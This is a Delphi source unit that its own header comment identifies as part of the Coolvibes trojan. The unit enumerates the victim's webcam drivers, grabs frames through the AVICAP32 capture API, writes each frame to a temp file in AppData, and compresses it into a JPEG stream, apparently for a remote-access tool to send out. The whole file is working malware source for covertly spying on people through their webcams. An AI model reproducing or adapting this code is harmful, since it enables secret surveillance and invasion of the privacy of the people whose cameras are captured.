{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en la captura de pantalla}
unit UnitCamScreen;

interface

uses
  Windows,
  Messages,
  
  UnitFunciones,
  classes,
  jpeg,
  Graphics,
  SHfolder;

function CapturarWebcam(var MS: TMemoryStream; NumeroDeWebcam: Integer; quality: Integer): Boolean;

procedure DesactivarWebcams();
const
  WM_CAP_START = $0400;
  WM_CAP_DRIVER_CONNECT = $0400 + 10;
  WM_CAP_DRIVER_DISCONNECT = $0400 + 11;
  WM_CAP_SAVEDIB = $0400 + 25;
  WM_CAP_GRAB_FRAME = $0400 + 60;
  WM_CAP_STOP = $0400 + 68;

var
  CaptureWindow: dword;

function capCreateCaptureWindowA(lpszWindowName: PChar; dwStyle: dword;
  x, y, nWidth, nHeight: Word; ParentWin: dword; nId: Word): dword;
stdcall; external 'AVICAP32.DLL';
function capGetDriverDescriptionA(wDriverIndex: UINT; lpszName: LPSTR;
  cbName: Integer; lpszVer: LPSTR; cbVer: Integer): BOOL; stdcall;
external 'AVICAP32.DLL';

function ListarDispositivos(): string;
//function CapturarWebcam(NivelCompresion, NumeroDeWebcam: Integer): Boolean;

implementation

function ListarDispositivos(): string;
var
  szName, szVersion: array[0..MAX_PATH] of char;
  iReturn: Boolean;
  x: Integer;
begin
  x := 0;
  repeat
    iReturn := capGetDriverDescriptionA(x, @szName, SizeOf(szName),
      @szVersion, SizeOf(szVersion));
    if iReturn then
      begin
        Result := Result + szName + ' - ' + szVersion + '|';
        Inc(x);
      end;
    if x = 10 then break;
  until iReturn = False;
end;

function CapturarWebcam(var MS: TMemoryStream; NumeroDeWebcam: Integer; quality: Integer): Boolean;
var
  bit: TBitmap;
  hDLL: THandle;
  buf: array[0..144] of char;
  jpg: TJPegImage;
  Bitmap: TBitmap;
begin
  Result := False;

  if CaptureWindow = 0 then
    begin
      CaptureWindow := capCreateCaptureWindowA('CaptureWindow', WS_CHILD and WS_VISIBLE, 0, 0, 0, 0, GetDesktopWindow, 0);
      if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 1 then
        begin
          SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
          SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
          CaptureWindow := 0;
        end;
    end;

  if CaptureWindow <> 0 then
    begin
      //    if SendMessage(CaptureWindow, WM_CAP_DRIVER_CONNECT, NumeroDeWebcam, 0) <> 0 then
      //    begin
      SendMessage(CaptureWindow, WM_CAP_GRAB_FRAME, 0, 0);
      SendMessage(CaptureWindow, WM_CAP_SAVEDIB, 0, Longint(PChar(GetSpecialFolderPath(CSIDL_LOCAL_APPDATA) + '~~tmp.tmp')));
      //      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
      //      CaptureWindow := 0;

      Result := True;

      //    end
      //    else
      //      Result := False;

          //comprimimos tmp.tmp...
      bit := TBitmap.Create();
      bit.LoadFromFile(GetSpecialFolderPath(CSIDL_LOCAL_APPDATA) + '~~tmp.tmp');
      if bit <> nil then
        begin
          Jpg := TjpegImage.Create;
          Jpg.Assign(bit);
          Jpg.CompressionQuality := quality;
          Jpg.Compress;
          Jpg.SaveToStream(MS); //guardamos el jpg en el memorystream
          Jpg.Free;
          bit.Free;
          Result := True;
        end
      else
        Result := False;

    end
  else
    Result := False;
end;

procedure DesactivarWebcams();
begin
  if CaptureWindow <> 0 then
    begin
      SendMessage(CaptureWindow, WM_CLOSE, 0, 0);
      SendMessage(CaptureWindow, WM_CAP_DRIVER_DISCONNECT, 0, 0);
      CaptureWindow := 0;
    end;
end;

end.
